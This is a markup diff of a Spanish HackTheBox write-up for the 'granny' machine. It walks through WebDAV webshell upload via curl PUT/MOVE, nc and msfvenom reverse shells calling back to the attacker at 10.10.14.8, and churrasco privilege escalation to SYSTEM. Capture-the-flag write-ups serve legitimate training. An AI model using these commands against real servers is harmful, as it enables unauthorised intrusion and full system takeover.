@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/granny/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="highlighter-rouge">granny</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">granny</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">granny</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">granny</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack granny
 <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.15
 
@@ -38,7 +38,7 @@ La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú
 80/tcp    open  http
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p80</span> <span class="nt">-sCV</span> 10.10.10.15 <span class="nt">-oN</span> versions
 PORT   STATE SERVICE VERSION
@@ -58,7 +58,7 @@ Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
 
 <h2 id="reconocimiento-web">RECONOCIMIENTO WEB</h2>
 
-<p>Iniciamos con el reconocimiento del servicio <code class="highlighter-rouge">web</code> donde inicialmente, por medio de la utilidad <code class="highlighter-rouge">whatweb</code> enumeramos información de librerías, gestores de contenido, entre otros.</p>
+<p>Iniciamos con el reconocimiento del servicio <code class="language-plaintext highlighter-rouge">web</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">whatweb</code> enumeramos información de librerías, gestores de contenido, entre otros.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.15
 </code></pre></div></div>
@@ -98,7 +98,7 @@ usage:iis6webdav.py targetip targetport reverseip reverseport
 
 <p>Otro método de intrusión se puede ejeutar por medio de la subida de una webshell al servidor víctima, para esto vamos a seguir las siguientes indicaciones.</p>
 
-<p>Hacemos uso de <code class="highlighter-rouge">davest</code> para auditar los archivos que podemos subir a un objetivo</p>
+<p>Hacemos uso de <code class="language-plaintext highlighter-rouge">davest</code> para auditar los archivos que podemos subir a un objetivo</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>davtest <span class="nt">-url</span> http://10.10.10.15
 </code></pre></div></div>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#OUTPUT</span>
@@ -115,7 +115,7 @@ Executes: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.txt
 Executes: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.html
 </code></pre></div></div>
 
-<p>Localizamos los binarios <code class="highlighter-rouge">.aspx</code> que contienen una webshell</p>
+<p>Localizamos los binarios <code class="language-plaintext highlighter-rouge">.aspx</code> que contienen una webshell</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate .aspx
 </code></pre></div></div>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#OUTPUT</span>
@@ -126,13 +126,13 @@ Executes: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.html
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/share/webshells/aspx/cmdasp.aspx webshell.aspx
 </code></pre></div></div>
 
-<p>Con los métodos HTTP <code class="highlighter-rouge">PUT</code> y <code class="highlighter-rouge">MOVE</code> para subir un archivo y cambiar la extensión de este, para acto seguido, ejecutar la web shell obteniendo ejecución remota de comandos.</p>
+<p>Con los métodos HTTP <code class="language-plaintext highlighter-rouge">PUT</code> y <code class="language-plaintext highlighter-rouge">MOVE</code> para subir un archivo y cambiar la extensión de este, para acto seguido, ejecutar la web shell obteniendo ejecución remota de comandos.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> PUT http://10.10.10.15/webshell.txt <span class="nt">-d</span> @webshell.aspx
 curl <span class="nt">-s</span> <span class="nt">-X</span> MOVE <span class="nt">-H</span> <span class="s2">"Destination:http://10.10.10.15/webshell.aspx"</span> http://10.10.10.15/webshell.txt
 </code></pre></div></div>
 
-<p>Copiamos en nuestro directorio, el binario para windows de <code class="highlighter-rouge">nc</code></p>
+<p>Copiamos en nuestro directorio, el binario para windows de <code class="language-plaintext highlighter-rouge">nc</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe nc.exe
 </code></pre></div></div>
 
@@ -140,17 +140,17 @@ curl <span class="nt">-s</span> <span class="nt">-X</span> MOVE <span class="nt"
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lnvp</span> 4564
 </code></pre></div></div>
 
-<p>Cargamos en el navegador el recurso <code class="highlighter-rouge">http://10.10.10.15/webshell.txt</code></p>
+<p>Cargamos en el navegador el recurso <code class="language-plaintext highlighter-rouge">http://10.10.10.15/webshell.txt</code></p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/granny/03-page.png" />
 </p>
 
-<p>Creamos un servicio de recursos compartidos <code class="highlighter-rouge">SMB</code></p>
+<p>Creamos un servicio de recursos compartidos <code class="language-plaintext highlighter-rouge">SMB</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
 </code></pre></div></div>
 
-<p>En la webshell ejecutamos por medio de un recurso compartido una reverse shell con la ayuda de <code class="highlighter-rouge">nc</code></p>
+<p>En la webshell ejecutamos por medio de un recurso compartido una reverse shell con la ayuda de <code class="language-plaintext highlighter-rouge">nc</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\\</span>10.10.14.8<span class="se">\s</span>mbFolder<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd 10.10.14.8 4564
 </code></pre></div></div>
 
@@ -174,19 +174,19 @@ Privilege Name                Description                               State
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 </code></pre></div></div>
 
-<p>Descargamos una variante de <code class="highlighter-rouge">JuicyPotato.exe</code> denominada <code class="highlighter-rouge">Churrasco.exe</code></p>
+<p>Descargamos una variante de <code class="language-plaintext highlighter-rouge">JuicyPotato.exe</code> denominada <code class="language-plaintext highlighter-rouge">Churrasco.exe</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
 </code></pre></div></div>
 
-<p>Generamos un payload que nos va a permitir la conexión reversa por medio de <code class="highlighter-rouge">msfvenom</code></p>
+<p>Generamos un payload que nos va a permitir la conexión reversa por medio de <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.8 <span class="nv">LPORT</span><span class="o">=</span>4566 <span class="nt">-f</span> exe <span class="nt">-o</span> rev.exe
 </code></pre></div></div>
 
-<p>Creamos un recurso compartido con <code class="highlighter-rouge">Impacket</code></p>
+<p>Creamos un recurso compartido con <code class="language-plaintext highlighter-rouge">Impacket</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
 </code></pre></div></div>
 
-<p>En la máquina víctima ingresamos a la carpeta <code class="highlighter-rouge">C:\Windows\Temp</code>, creamos la carpeta <code class="highlighter-rouge">privesc</code> y copiamos el archivo <code class="highlighter-rouge">rev.exe</code> en el objetivo</p>
+<p>En la máquina víctima ingresamos a la carpeta <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code>, creamos la carpeta <code class="language-plaintext highlighter-rouge">privesc</code> y copiamos el archivo <code class="language-plaintext highlighter-rouge">rev.exe</code> en el objetivo</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>c:<span class="se">\W</span>indows<span class="se">\T</span>emp
 <span class="nb">mkdir </span>privesc
 <span class="nb">cd </span>privesc
@@ -197,18 +197,18 @@ copy <span class="se">\\</span>10.10.14.8<span class="se">\s</span>mbFolder<span
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lnvp</span> 4566
 </code></pre></div></div>
 
-<p>Ejecutamos en la máquina víctima <code class="highlighter-rouge">churrasco.exe</code> para que ejecute con privilegios <code class="highlighter-rouge">rev.exe</code></p>
+<p>Ejecutamos en la máquina víctima <code class="language-plaintext highlighter-rouge">churrasco.exe</code> para que ejecute con privilegios <code class="language-plaintext highlighter-rouge">rev.exe</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\\</span>10.10.14.8<span class="se">\s</span>mbFolder<span class="se">\c</span>hurrasco.exe <span class="s2">"</span><span class="se">\\</span><span class="s2">10.10.14.8</span><span class="se">\s</span><span class="s2">mbFolder</span><span class="se">\r</span><span class="s2">ev.exe"</span>
 </code></pre></div></div>
 
-<p>Obtenemos una shell como <code class="highlighter-rouge">nt authority\system</code></p>
+<p>Obtenemos una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami
 </span>nt authority<span class="se">\s</span>ystem
 </code></pre></div></div>
 
 <h2 id="flags">FLAGS</h2>
 
-<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#USER</span>
 <span class="nb">cd </span>c:<span class="se">\</span>
@@ -226,9 +226,9 @@ echo.%root:~0,10%
 aa4beed1c0
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">granny</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">granny</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/granny/04-finish.png" />
 </p>
 
